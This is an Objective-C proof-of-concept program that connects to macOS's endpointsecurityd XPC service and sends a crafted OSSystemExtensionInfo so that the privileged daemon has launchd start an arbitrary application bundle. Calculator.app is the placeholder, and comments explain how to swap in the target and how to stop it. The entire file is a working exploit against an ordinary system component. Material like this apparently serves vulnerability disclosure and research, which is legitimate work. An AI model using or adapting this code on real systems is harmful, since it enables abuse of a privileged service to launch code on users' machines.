#import <Foundation/Foundation.h>
#import "_OSSystemExtensionPointInterface.h"
#import "OSSystemExtensionInfo.h"

/*
 * This needs to be linked against the SystemExtensions framework in order to use
 * the real OSSystemExtensionInfo and get NSSecureCoding serialization support
 * correct.
 *
 * This proof of concept simply tells the endpointsecurityd daemon to launch a job
 * with launchd.
 */

int main(int argc, const char * argv[]) {
    @autoreleasepool {
        NSXPCConnection *connection = [[NSXPCConnection alloc] initWithMachServiceName:@"com.apple.endpointsecurity.system-extensions"
                            options:0x1000];
        
        NSXPCInterface *interface = [NSXPCInterface interfaceWithProtocol:@protocol(_OSSystemExtensionPointInterface)];
        [connection setRemoteObjectInterface:interface];
        
        [connection setInvalidationHandler:^{
            NSLog(@"ESDClient invalidation handler!");
            exit(1);
        }];
        
        [connection setInterruptionHandler:^{
            NSLog(@"ESDClient interruption handler!");
            exit(1);
        }];
        
        [connection resume];

        // We use the real class so it's NSSecureCoding implementation is correct
        Class OSSystemExtensionInfoClass = NSClassFromString(@"OSSystemExtensionInfo");
        OSSystemExtensionInfo *info = [[OSSystemExtensionInfoClass alloc] init];

        // This should be the application you want to launch
        info.stagedBundleURL = [NSURL fileURLWithPath:@"/System/Applications/Calculator.app/"];
        
        // This doesn't really matter but endpointsecurityd will add a ".xpc" to the end and pass it
        // to Launchd as the MachService
        info.identifier = @"com.test";

        // Change to terminateExtension to stop the app from running
        [[connection remoteObjectProxy] startExtension:info replyHandler:^void (NSError *error) {
            if (error != nil) {
                NSLog(@"ESDClient startExtension error");
                exit(1);
            } else {
                NSLog(@"ESDClient started");
                exit(0);
            }
        }];
        
        [[NSRunLoop currentRunLoop] run];
    }
    return 0;
}
